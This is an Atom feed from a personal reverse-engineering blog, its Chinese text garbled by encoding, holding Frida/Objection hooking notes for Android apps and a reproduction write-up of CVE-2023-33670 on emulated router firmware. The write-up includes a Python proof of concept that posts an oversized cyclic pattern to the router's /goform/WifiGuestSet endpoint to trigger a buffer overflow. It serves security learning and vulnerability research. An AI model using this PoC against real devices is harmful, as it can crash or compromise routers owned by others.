<?xml version='1.0' encoding='utf-8'?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <id>https://az0x01-blog.vercel.app/</id>
  <title><![CDATA[Az's Blog]]></title>
  <subtitle><![CDATA[anything]]></subtitle>
  <icon>https://az0x01-blog.vercel.app/favicon.png</icon>
  <link href="https://az0x01-blog.vercel.app" />
  <link href="https://az0x01-blog.vercel.app/atom.xml" rel="self" type="application/atom+xml" />
  <updated>2023-11-06T15:06:52.762Z</updated>
  <author>
    <name><![CDATA[Az]]></name>
  </author>
  <category term="frida" scheme="https://az0x01-blog.vercel.app/?tags=frida" />
  <category term="PWN" scheme="https://az0x01-blog.vercel.app/?tags=PWN" />
  <category term="IoT" scheme="https://az0x01-blog.vercel.app/?tags=IoT" />
  <category term="Android" scheme="https://az0x01-blog.vercel.app/?tags=Android" />
  <category term="Rev" scheme="https://az0x01-blog.vercel.app/?tags=Rev" />
  <entry>
    <title type="html"><![CDATA[Frida å­¦ä¹ ç¬”è®°]]></title>
    <link href="https://az0x01-blog.vercel.app/20231106" />
    <id>https://az0x01-blog.vercel.app/20231106</id>
    <published>2023-11-06T00:00:00.000Z</published>
    <updated>2023-11-06T00:00:00.000Z</updated>
    <content type="html">
      <![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</a></h2><ul><li>å®‰è£… node å’Œ npmï¼Œgit æ‹‰å– frida-agent-example ä»“åº“</li><li>ä¸‹è½½ç‰ˆæœ¬å¯¹åº”çš„ fridaã€ frida-toolsã€ frida-server</li><li>åœ¨æ‰‹æœºçš„ data/local/tmp ä¸‹è¿è¡Œ frida-server </li></ul><h2 id="android-è™šæ‹Ÿæœºæ­å»º"><a href="#android-è™šæ‹Ÿæœºæ­å»º">Android è™šæ‹Ÿæœºæ­å»º</a></h2><h3 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®">ç¯å¢ƒé…ç½®</a></h3><ul><li>VMware ä¸‹çš„ Linux è™šæ‹Ÿæœºï¼Œæœ‰å®Œæ•´ frida ç¯å¢ƒ</li><li>ä½¿ç”¨ Genymotion çš„ Android x86_64 è™šæ‹Ÿæœº</li></ul><h3 id="ç½‘ç»œé…ç½®"><a href="#ç½‘ç»œé…ç½®">ç½‘ç»œé…ç½®</a></h3><p>é»˜è®¤é…ç½®å‡ä¸ºNAT ï¼Œéœ€è¦å…¨éƒ¨æ›´æ”¹ä¸ºæ¡¥æ¥:</p><ul><li><p>VMware éœ€è¦å¯ç”¨ å¤åˆ¶ç‰©ç†åœ°å€</p></li><li><p>åœ¨ Genymotion çš„è®¾ç½®ä¸­å°†ç½‘ç»œçŠ¶æ€æ”¹ä¸ºæ¡¥æ¥</p></li><li><p>åœ¨ VirtualBox ä¸­å°†å®‰å“è™šæ‹Ÿæœºçš„ç½‘å¡ 2 æ”¹ä¸ºæ¡¥æ¥, ç¡®è®¤å’Œ VMware æ¡¥æ¥è‡³åŒä¸€ç½‘å¡ï¼Œä¸”å°†ä¸¤ä¸ªç½‘å¡çš„æ··æ‚æ¨¡å¼æ”¹ä¸ºå…¨éƒ¨å…è®¸</p></li></ul><h3 id="è¿æ¥ä½¿ç”¨"><a href="#è¿æ¥ä½¿ç”¨">è¿æ¥ä½¿ç”¨</a></h3><ul><li><p>åœ¨kaliä¸­ä½¿ç”¨ <code>adb connnect &lt;å®‰å“è™šæ‹ŸæœºIP&gt;</code> è¿æ¥adb</p></li><li><p>ä½¿ç”¨ <code>adb push</code>å°†å¯¹åº”çš„ frida-server æ–‡ä»¶æ¨åˆ° <em>/data/local/tmp</em> æ–‡ä»¶å¤¹ä¸‹å¹¶èµ‹äºˆæƒé™ï¼Œä¸çŸ¥ä»€ä¹ˆåŸå› ï¼Œè¿™é‡Œçš„64ä½æ–‡ä»¶æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œä½†32ä½çš„æ²¡æœ‰é—®é¢˜</p></li><li><p>ä½¿ç”¨ <code>./frida-server-15.2.2-android-x86 -l 0.0.0.0:8888</code>å¯ç”¨ç½‘ç»œæ¨¡å¼è¿æ¥</p></li><li><p>ç°åœ¨ <code>frida-ps -H 192.168.0.232:8888 -a</code>å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†ï¼Œ è¿˜å¯ä»¥ç”¨<code>objection -N -h 192.168.0.232 -p 8888 -g com.android.settings explore</code> ä½¿ç”¨ objection (192.168.0.232 æ˜¯ Android IP)</p></li></ul><h2 id="hook-demo"><a href="#hook-demo">Hook Demo</a></h2><ul><li>åœ¨ frida-agent-example æ ¹ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª hello.js æ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹ï¼š</li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'>function hook() &#123;</div><div class='line'>    // frida çš„å…¥å£</div><div class='line'>    Java.perform(function () &#123;</div><div class='line'>        // ä»¥ä¸‹ä¸ºåŠŸèƒ½å®ç°ä»£ç </div><div class='line'>        var settings = Java.use("com.android.settings.DisplaySettings");</div><div class='line'>        var getMetricsCategory_func = settings.getMetricsCategory;</div><div class='line'>        console.log("log:")</div><div class='line'>        getMetricsCategory_func.implementation = function () &#123;</div><div class='line'>            var result = this.getMetricsCategory()</div><div class='line'>            console.log("log:", '===&gt;', result)</div><div class='line'>            return result</div><div class='line'>        &#125;</div><div class='line'>    &#125;)</div><div class='line'>&#125;</div><div class='line'>hook();</div><div class='line'>// æˆ–è€…: setTimeout(hook), è¿™é‡Œçš„setTimeoutä¸æ˜¯jsæ ‡å‡†åº“çš„setTimeoutï¼Œä½œç”¨å’Œfridaçš„javascriptçº¿ç¨‹æœ‰å…³</div></code></div></pre><!-- HTML_TAG_END --><ul><li>åœ¨Androidä¸Šå¯åŠ¨ frida-serverï¼Œæ·»åŠ  <code>-l 0.0.0.0:8888</code> å¯ä»¥å¯ç”¨ç½‘ç»œç›‘å¬</li><li>ä½¿ç”¨ <code>frida -U -f com.android.settings -l hello.js</code> è¿è¡Œ ï¼Œè¿™æ—¶ç‚¹å‡»è®¾ç½®ä¸­çš„æ˜¾ç¤ºé€‰é¡¹å°±ä¼šæ‰“å°Hookå€¼ï¼ˆconsole.log æ‰“å°çš„å€¼ï¼‰</li></ul><blockquote><p>-U ä¸º é€šè¿‡ USB è¿æ¥ ã€-f ä¸ºä½¿ç”¨ spawn æ¨¡å¼</p></blockquote><h2 id="å¸¸ç”¨æ’ä»¶"><a href="#å¸¸ç”¨æ’ä»¶">å¸¸ç”¨æ’ä»¶</a></h2><ul><li><code>Objection</code>  ï¼Œä½¿ç”¨pipå®‰è£…ï¼Œè¯·æ³¨æ„å®‰è£…é¡ºåºï¼Œå…ˆå®‰è£…<code>frida</code>å’Œ<code>frida-tools</code>ï¼Œå†å®‰è£…å¯¹åº”ç‰ˆæœ¬çš„<code>Objection</code></li><li><code>WallBreaker</code> , å’Œ<code>Objection</code>ä¸€æ ·æ˜¯ç”¨äºå¿«é€Ÿå®šä½ç±»ä¸­åŒ…å«çš„å±æ€§å’Œå‡½æ•°(å†…å­˜æšä¸¾ï¼‰<a href="https://bbs.kanxue.com/thread-277929.htm" rel="nofollow noopener noreferrer external" target="_blank">æ•™ç¨‹</a></li></ul><!-- HTML_TAG_START --><pre class="shiki material-default" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>// Objection å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š</div><div class='line'></div><div class='line'>// æ³¨å…¥</div><div class='line'>objection -g com.android.settings explore</div><div class='line'>// é€šè¿‡ -c å¯ä»¥è¯»å–æ–‡ä»¶ä¸­çš„å¤šæ¡å‘½ä»¤æ‰§è¡Œ</div><div class='line'>objection -g com.android.settings explore -c hook.txt</div><div class='line'></div><div class='line'>// æšä¸¾å†…å­˜ä¸­å·²åŠ è½½çš„ç±»</div><div class='line'>android hooking list classes  </div><div class='line'>// åœ¨å·²åŠ è½½çš„ç±»ä¸­æœç´¢åŒ…å«å…³é”®å­—çš„ç±»</div><div class='line'>android hooking search classes &lt;pattern&gt;</div><div class='line'>// æœç´¢åŒ…å«å…³é”®å­—keyçš„æ–¹æ³•</div><div class='line'>android hooking search methods &lt;key&gt;</div><div class='line'>// åŒ…å«ç‰¹å®šå­—ç¬¦</div><div class='line'>android hooking list classes &lt;pattern&gt; </div><div class='line'>// è·å–æŒ‡å®šç±»ä¸­çš„æ‰€æœ‰éæ„é€ å‡½æ•°çš„æ‰€æœ‰æ–¹æ³•</div><div class='line'>android hooking list class_methods &lt;class_name&gt; </div><div class='line'>// Hookç±»ä¸­çš„æ‰€æœ‰éæ„é€ å‡½æ•°çš„æ–¹æ³•(é¡ºåº)</div><div class='line'>android hooking watch class &lt;class_name&gt; </div><div class='line'>// Hook æŒ‡å®šå‡½æ•°æ–¹æ³•(å€’åº)</div><div class='line'>android hooking watch class_method com.az.az.loading.setXXXX "xx(overload)" --dump-args --dump-return --dump-backtrace</div><div class='line'>// ä¸»åŠ¨è°ƒç”¨,æ‰“å°ç›¸å…³å®ä¾‹</div><div class='line'>android heap search instances &lt;classname&gt;</div><div class='line'>// ä½¿ç”¨ hashcode è°ƒç”¨å®ä¾‹</div><div class='line'>android heap execute &lt;hashcode&gt; &lt;methodname&gt;</div><div class='line'></div><div class='line'>// ä½œä¸šç³»ç»Ÿçš„ä½¿ç”¨</div><div class='line'>jobs list</div><div class='line'>jobs kill &lt;Hook ID&gt;</div><div class='line'></div><div class='line'>// åˆ—å‡ºè¿›ç¨‹çš„æ‰€æœ‰activity</div><div class='line'>android hooking list activities</div><div class='line'></div><div class='line'>############# åˆ† ç•Œ çº¿ ##############</div><div class='line'></div><div class='line'>// Wallbreaker çš„å®‰è£…å’Œä½¿ç”¨</div><div class='line'>mkdir -p ~/.objection/plugins/</div><div class='line'>git clone https://github.com/hluwa/Wallbreaker ~/.objection/plugins/Wallbreaker</div><div class='line'></div><div class='line'>// åŠ è½½æ’ä»¶</div><div class='line'>objection -g com.example.android explore  -P ~/.objection/plugins</div><div class='line'>// å†…å­˜æœç´¢ç±»ã€å®ä¾‹</div><div class='line'>plugin wallbreaker objectsearch LoginActivity</div><div class='line'>// æ ¹æ®ç±»åæœç´¢å†…å­˜ä¸­å·²ç»è¢«åˆ›å»ºçš„å®ä¾‹ï¼Œåˆ—å‡º handle å’Œ toString() çš„ç»“æœ --fullname æ‰“å°å®Œæ•´çš„åŒ…å</div><div class='line'>plugin wallbreaker classdump com.example.android.Activity.LoginActivity --fullname</div><div class='line'>// æŸ¥çœ‹å¯¹è±¡çš„ä¸€äº›å±æ€§å’Œæ–¹æ³•</div><div class='line'>plugin wallbreaker objectdump 0x2222 --fullname</div></code></div></pre><!-- HTML_TAG_END --><ul><li><code>Zentrace</code> éœ€è¦å…ˆå®‰è£… <code>PyQt5</code> å’Œ <code>frida</code>ï¼Œç”¨äºå…³é”®ç±»å®šä½ï¼ˆ Trace æšä¸¾ï¼‰</li><li><code>dexdump</code> ç”¨äºä¸€ä»£æ•´ä½“åŠ å›º</li><li><code>frida_fart (FART)</code> ç”¨äºäºŒä»£æŠ½å–åŠ å£³</li></ul><h2 id="native-å±‚-hook"><a href="#native-å±‚-hook">Native å±‚ Hook</a></h2><!-- HTML_TAG_START --><pre class="shiki material-default" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'>Java.perform(function () &#123;  // ä¹Ÿå¯ä»¥ä¸å†™ï¼ˆç¡®ä¿çº¿ç¨‹attachåˆ°å®‰å“è™šæ‹Ÿæœºä¸Šæ‰æ‰§è¡Œï¼‰</div><div class='line'>    ...</div><div class='line'>    // Hook æ¨¡æ¿</div><div class='line'>    Interceptor.attach(addr,&#123;// addr æ˜¯ç›®æ ‡å‡½æ•°çš„åœ°å€</div><div class='line'>        onEnter(args) &#123;</div><div class='line'>            /* do something with args */</div><div class='line'>        &#125;,</div><div class='line'>        onLeave(retval) &#123;</div><div class='line'>            /* do something with retval */</div><div class='line'>        &#125;</div><div class='line'>    &#125;);</div><div class='line'>    ...</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><ul><li>ç›®çš„æ˜¯å¯»æ‰¾ Java å±‚å‡½æ•°åœ¨ native å±‚ä¸­çš„å¯¹åº”<strong>åœ°å€</strong></li><li>åœ¨ <code>Objection</code> ä¸­æ‰§è¡Œ <code>memory list modules</code>æŸ¥çœ‹ä½ å†…å­˜ä¸­çš„ <code>.so </code>æ–‡ä»¶ï¼Œä½¿ç”¨ <code>--json output.json</code> æ¥å¯¼å‡º</li><li>æ‰§è¡Œ<code>memory list exports XXX.so</code>  æŸ¥çœ‹ç›¸åº”æ–‡ä»¶å¯¼å‡ºçš„æ‰€æœ‰ç¬¦å·ï¼Œå¯ä»¥æ‰¾åˆ°å‡½æ•°åå¯¹åº”çš„åœ°å€ï¼Œä½†è¿™é‡Œçš„ç»å¯¹åœ°å€åœ¨æ¯æ¬¡åŠ è½½æ—¶éƒ½ä¸åŒï¼Œä¸å˜çš„æ˜¯å‡½æ•°åœ°å€ç›¸å¯¹äºåŸºåœ°å€çš„åç§»ï¼Œé€šè¿‡åç§»å¯ä»¥åœ¨é™æ€åˆ†ææ—¶æ‰¾åˆ°å¯¹åº”å‡½æ•°ï¼Œä½¿ç”¨ <code>--json output.json</code> æ¥å¯¼å‡º(å¦‚æœåœ¨Javaå±‚å‡½æ•°ç¼–å†™æ—¶æœªæ·»åŠ <code>extern C</code> æè¿°ç¬¦ï¼Œä¼šå› ä¸º C++ çš„ <code>name mangling</code> å¯¼è‡´ç¼–è¯‘å®Œæˆçš„å‡½æ•°åå‘ç”Ÿä¸€äº›å˜åŒ–ï¼Œè¢«ç ´åçš„å‡½æ•°åå¯ä»¥ä½¿ç”¨<code>C++filt</code>å·¥å…·æ¢å¤)</li></ul><h3 id="nativeå±‚å¯¼æ•°"><a href="#nativeå±‚å¯¼æ•°">nativeå±‚å¯¼æ•°</a></h3><p>ä½¿ç”¨Fridaæä¾›çš„ API è·å¾—å‡½æ•°é¦–åœ°å€ï¼š</p><!-- HTML_TAG_START --><pre class="shiki material-default" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'>function hook_native() &#123;</div><div class='line'>    var addr = Module.getExportByName("libnativetty.so", "Java_az_test_nativetty_MainActivity_stringFromJNI");// ç›®æ ‡.so å’Œ å‡½æ•°å</div><div class='line'>    Interceptor.attach(addr, &#123;</div><div class='line'>        onEnter: function (args) &#123;</div><div class='line'>            console.log("jnienv =&gt; ", args[0])</div><div class='line'>            console.log("jobj pointer =&gt; ", args[1])</div><div class='line'></div><div class='line'>        &#125;,</div><div class='line'>        onLeave: function (retval) &#123;</div><div class='line'>            console.log("retval =&gt; ", Java.vm.getEnv().getStringUtfChars(retval, null).readCString())</div><div class='line'>            console.log("â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”")</div><div class='line'>        &#125;</div><div class='line'></div><div class='line'>    &#125;)</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>setImmediate(hook_native)</div></code></div></pre><!-- HTML_TAG_END --><h3 id="énativeå±‚å¯¼å‡ºå‡½æ•°ä½¿ç”¨åŠ¨æ€æ³¨å†Œçš„jniå‡½æ•°"><a href="#énativeå±‚å¯¼å‡ºå‡½æ•°ä½¿ç”¨åŠ¨æ€æ³¨å†Œçš„jniå‡½æ•°">énativeå±‚å¯¼å‡ºå‡½æ•°ï¼ˆä½¿ç”¨åŠ¨æ€æ³¨å†Œçš„JNIå‡½æ•°ï¼‰</a></h3><p>é€šè¿‡è·å¾—æ¨¡å—åœ°å€ç›¸å¯¹äºåŸºåœ°å€çš„åç§»æ¥ç¡®å®šå‡½æ•°çš„ç»å¯¹åœ°å€</p><ul><li>é¡¹ç›® [frida_hook_libart](<a href="https://github.com/lasting-yang/frida_hook_libart" rel="nofollow noopener noreferrer external" target="_blank">lasting-yang/frida_hook_libart: Frida hook some jni functions (github.com)</a>) åŒ…å«JNIå‡½æ•°å’Œ art å‡½æ•°çš„Hook è„šæœ¬,ä½¿ç”¨å…¶ä¸­çš„ <code>hook_RegisterNatives.js</code>,å¯ä»¥è·å¾—åç§»</li><li>åœ¨è·å¾—åç§»åä½¿ç”¨fridaæä¾›çš„api <code>Module.findBaseAddress</code> è·å¾—å‡½æ•°åœ°å€å¹¶è¿›è¡ŒHook</li></ul><h3 id="libåº“çš„hook"><a href="#libåº“çš„hook">libåº“çš„Hook</a></h3><p>ä½¿ç”¨ <code>memory list exports XXX.so --json ./output.json</code> å¯¼å‡ºæ¨¡å—ä¸­çš„å¯¼å‡ºå‡½æ•°</p><p>ä½¿ç”¨ frida-trace å¯ä»¥å¿«é€Ÿtraceå‡½æ•° <code>frida-trace -UF -I libXXX.so</code></p><p>ä½¿ç”¨ Frida å†™æ–‡ä»¶</p><!-- HTML_TAG_START --><pre class="shiki material-default" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'>function write(path, contents)&#123;</div><div class='line'>    var fopen_addr = Module.findExportByName("libc.so", "fopen");</div><div class='line'>    var fputs_addr = Module.findExportByName("libc.so", "fputs");</div><div class='line'>    var fclose_addr = Module.findExportByName("libc.so", "fclose");</div><div class='line'></div><div class='line'>    var fopen = new NativeFunction(fopen_addr, ["pointer", "pointer"])</div><div class='line'>    var puts = new NativeFunction(fputs_addr, "int", ["pointer", "pointer"])</div><div class='line'>    </div><div class='line'>    var fileName = Memory.allocUtf8String(path);</div><div class='line'>    var mode = Memory.allocUtf8String("a+");</div><div class='line'></div><div class='line'>    var fp = fopen(fileName, mode);</div><div class='line'>    var contentHello = Memory.allocUtf8String(contents);</div><div class='line'>    var ret = fputs(contentHello, fp);</div><div class='line'>    fclose(fp);</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><h2 id="ä¸»åŠ¨è°ƒç”¨rpcå…¥é—¨"><a href="#ä¸»åŠ¨è°ƒç”¨rpcå…¥é—¨">ä¸»åŠ¨è°ƒç”¨ã€RPCå…¥é—¨</a></h2><p>RPC æŒ‡é€šè¿‡ç½‘ç»œä»è¿œç¨‹è®¡ç®—æœºç¨‹åºä¸Šè¯·æ±‚æœåŠ¡, éœ€è¦å°†jsè„šæœ¬è¿›è¡Œå¤„ç†ï¼Œä½¿å…¶è¢«pythonç¨‹åºè°ƒç”¨ï¼Œä¾¿äºä½¿ç”¨ã€‚ä¾‹ï¼š</p><!-- HTML_TAG_START --><pre class="shiki material-default" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'># loader.py</div><div class='line'>import frida, time</div><div class='line'></div><div class='line'>device = frida.get_usb_device()</div><div class='line'>pid = device.spawn("com.symbolic.pitchlab") #ç›®æ ‡åŒ…å</div><div class='line'></div><div class='line'>device.resume(pid)</div><div class='line'>time.sleep(1)</div><div class='line'>session = device.attach(pid)</div><div class='line'></div><div class='line'>with open("tty.js") as f:</div><div class='line'>    script = session.create_script(f.read())</div><div class='line'>    script.load()</div><div class='line'>    while(True):</div><div class='line'>        script.exports.output_func() #jså¯¼å‡ºå‡½æ•°è°ƒç”¨</div><div class='line'>        time.sleep(0.5)</div></code></div></pre><!-- HTML_TAG_END --><!-- HTML_TAG_START --><pre class="shiki material-default" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'>// tty.js</div><div class='line'>function hook_native() &#123;</div><div class='line'>    var result; // éœ€è¦æ”¾åœ¨ perform å¤–é¢</div><div class='line'>    Java.perform(function () &#123;</div><div class='line'>        var addr = Module.getExportByName("libPitchLab.so", "Java_com_symbolic_pitchlab_PitchLabNative_processStreamedSamples"); //ç›®æ ‡åº“æ–‡ä»¶å’Œå‡½æ•°</div><div class='line'>        Interceptor.attach(addr, &#123;</div><div class='line'>            onEnter: function (args) &#123;</div><div class='line'>                for (let index = 0; index &lt; 14; index++) &#123;</div><div class='line'>                    const element = args[index];</div><div class='line'>                    console.log( element)</div><div class='line'>                &#125;</div><div class='line'>            &#125;,</div><div class='line'>            onLeave: function (retval) &#123;</div><div class='line'>                //do something</div><div class='line'>            &#125;</div><div class='line'>        &#125;)</div><div class='line'>    &#125;)</div><div class='line'>    return result</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>rpc.exports = &#123;</div><div class='line'>    output_func: hook_native</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><h2 id="adb-å‘½ä»¤æ‹¾é—"><a href="#adb-å‘½ä»¤æ‹¾é—">adb å‘½ä»¤æ‹¾é—</a></h2><!-- HTML_TAG_START --><pre class="shiki material-default" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'>netstat -alpe</div><div class='line'>lsof -p 8888 -l</div><div class='line'>adb shell dumpsys activity top</div><div class='line'>adb shell dumpsys package &lt;package_name&gt;</div><div class='line'>adb shell dumpsys dbinfo &lt;package_name&gt;</div><div class='line'>adb shell pm list packages</div><div class='line'>adb shell am start-activity -D -N com.example.az/.MainActivity</div></code></div></pre><!-- HTML_TAG_END -->]]>
    </content>
    <category term="frida" scheme="https://az0x01-blog.vercel.app/?tags=frida" />
  </entry>
  <entry>
    <title type="html"><![CDATA[CVE-2023-33670 å¤ç°]]></title>
    <link href="https://az0x01-blog.vercel.app/20230823" />
    <id>https://az0x01-blog.vercel.app/20230823</id>
    <published>2023-08-23T00:00:00.000Z</published>
    <updated>2023-09-19T00:00:00.000Z</updated>
    <summary type="html"><![CDATA[ä»¥åŠæ°´åˆ°çš„ç¬¬ä¸€ä¸ª CVE ç¼–å·]]></summary>
    <content type="html">
      <![CDATA[<h2 id="bin-æ–‡ä»¶çš„å¤„ç†"><a href="#bin-æ–‡ä»¶çš„å¤„ç†">bin æ–‡ä»¶çš„å¤„ç†</a></h2><p>ä½¿ç”¨ binwalk å¯¹ bin æ–‡ä»¶è¿›è¡Œå¤„ç†</p><p>å®‰è£… : <code>apt install binwalk</code></p><p>å‘½ä»¤ : <code>binwalk -Me ./*.bin</code></p><p>è§£åŒ…åå³ä¸ºæ ‡å‡†çš„ unix æ–‡ä»¶ç³»ç»Ÿ</p><h2 id="qemu-ç¯å¢ƒæ­å»º"><a href="#qemu-ç¯å¢ƒæ­å»º">qemu ç¯å¢ƒæ­å»º</a></h2><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>  apt-get install qemu-system</div><div class='line'>  apt-get install qemu-user-static</div></code></div></pre><!-- HTML_TAG_END --><p>ä»¥ <code>./bin/httpd</code> ä¸ºç›®æ ‡ï¼Œä½¿ç”¨<code>file</code>æŸ¥çœ‹ä¿¡æ¯ï¼ŒLSB é€‰æ‹© mipsel</p><p>è¿›å…¥åˆ°è§£åŒ…åçš„<strong>*bin/extracted/squashfs-root/</strong>ç›®å½•ä¸‹</p><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>  cp $(which qemu-mipsel-static) ./</div><div class='line'>  sudo chroot ./ ./qemu-mipsel-static ./bin/httpd</div></code></div></pre><!-- HTML_TAG_END --><p>å¯åŠ¨<strong>ç›®æ ‡ httpd</strong>ï¼Œç”±äºå­˜åœ¨æ£€æŸ¥ï¼Œå¤±è´¥</p><h2 id="ä¿®è¡¥ç¨‹åºå»æ‰-check"><a href="#ä¿®è¡¥ç¨‹åºå»æ‰-check">ä¿®è¡¥ç¨‹åºï¼Œå»æ‰ check</a></h2><p>Patch å‰ï¼š</p><p><img src="./image-20230823195926271.png" alt="image-20230823195926271" class="rounded-lg my-2" loading="lazy" decoding="async"></p><p>ä½¿ç”¨ IDAPro è¿›è¡Œ Patch</p><p><img src="./image-20230823200528802.png" alt="image-20230823200528802" class="rounded-lg my-2" loading="lazy" decoding="async"></p><p>é€šè¿‡æœç´¢<strong>Welcome</strong>å…³é”®å­—ï¼Œæ‰¾åˆ°ç¨‹åºä¸­æ–­ç‚¹ï¼Œ</p><p>åˆ‡æ¢åˆ°å›¾æ¨¡å¼ï¼Œå¯ä»¥ç¡®è®¤åœ¨ <code>bgez</code> å¤„è¿›è¡Œåˆ¤æ–­ï¼Œåªéœ€è¦å°†åŸæ¥çš„ <code>&gt;=</code> ä¿®æ”¹å³å¯ï¼Œä¹Ÿå°±æ˜¯å°† <code>bgez</code> æ”¹ä¸º <code>bltz</code></p><p>åœ¨ <code>Edit -&gt; Patch program -&gt; Change byte</code>ä¸­ å°†<code>0A 00 41 04</code>æ”¹ä¸º<code>0A 00 01 04</code> å³å¯</p><p>Patch åï¼š</p><p><img src="./image-20230823195553164.png" alt="image-20230823195553164" class="rounded-lg my-2" loading="lazy" decoding="async"></p><h2 id="åˆ›å»º-bridge"><a href="#åˆ›å»º-bridge">åˆ›å»º <code>bridge</code></a></h2><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>sudo brctl addbr br0</div><div class='line'>sudo brctl addif br0 eth0 &lt;- [eth0 from your interface on ifconfig]</div><div class='line'>sudo ifconfig br0 up</div><div class='line'>sudo dhclient br0</div></code></div></pre><!-- HTML_TAG_END --><p>å¦‚å‡ºç°<code>Unsupported setsockopt level=65535 optname=128</code></p><p>æ‰§è¡Œ <code>cp -rf ./webroot_ro/* ./var/webroot/</code> å³å¯æ­£å¸¸è¿è¡Œ</p><h2 id="ä½¿ç”¨-poc-æ”»å‡»"><a href="#ä½¿ç”¨-poc-æ”»å‡»">ä½¿ç”¨ Poc æ”»å‡»</a></h2><!-- HTML_TAG_START --><pre class="shiki material-default" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'>import requests</div><div class='line'></div><div class='line'>host = "192.168.59.136:80"</div><div class='line'>cyclic = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaa"</div><div class='line'></div><div class='line'>def exploit_WifiGuestSet():</div><div class='line'>    url = f"http://&#123;host&#125;/goform/WifiGuestSet"</div><div class='line'>    data = &#123;</div><div class='line'>        b'shareSpeed':cyclic</div><div class='line'>    &#125;</div><div class='line'>    res = requests.post(url=url,data=data)</div><div class='line'>    print(res.content)</div><div class='line'></div><div class='line'>exploit_WifiGuestSet()</div></code></div></pre><!-- HTML_TAG_END --><h2 id="mips-ç¼–è¯‘æµ‹è¯•"><a href="#mips-ç¼–è¯‘æµ‹è¯•">MIPS ç¼–è¯‘æµ‹è¯•</a></h2><p>å®‰è£…ç¼–è¯‘å™¨</p><p><code>sudo apt-get install gcc-mips-linux-gnu</code></p><p>ä½¿ç”¨ä¸‹é¢ä»£ç æµ‹è¯•</p><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>#include &lt;stdio.h&gt;</div><div class='line'></div><div class='line'>int main(void) &#123;</div><div class='line'>    printf("hello&#92;n");</div><div class='line'>    return 0;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>ç¼–è¯‘</p><p><code>mips-linux-gnu-gcc -static hello.c -o hello</code></p><p>è¿è¡Œç»“æœ</p><!-- HTML_TAG_START --><pre class="shiki material-default"><div class='code-container'><code><div class='line'>$ cp /usr/bin/qemu-mips-static .</div><div class='line'>$ qemu-mips-static ./hello</div><div class='line'>hello</div></code></div></pre><!-- HTML_TAG_END --><h2 id="ç…§çŒ«ç”»è™"><a href="#ç…§çŒ«ç”»è™">ç…§çŒ«ç”»è™</a></h2><blockquote><p>æ°´åˆ°äº†ç¬¬ä¸€ä¸ª CVE ç¼–å· <code>CVE-2023-42320</code></p></blockquote>]]>
    </content>
    <category term="PWN" scheme="https://az0x01-blog.vercel.app/?tags=PWN" />
  </entry>
  <entry>
    <title type="html"><![CDATA[LVGL åˆæ¢]]></title>
    <link href="https://az0x01-blog.vercel.app/20230805" />
    <id>https://az0x01-blog.vercel.app/20230805</id>
    <published>2023-08-05T00:00:00.000Z</published>
    <updated>2023-08-05T00:00:00.000Z</updated>
    <summary type="html"><![CDATA[ä½¿ç”¨ SquareLine Stdio çš„ GUI å¼€å‘]]></summary>
    <content type="html">
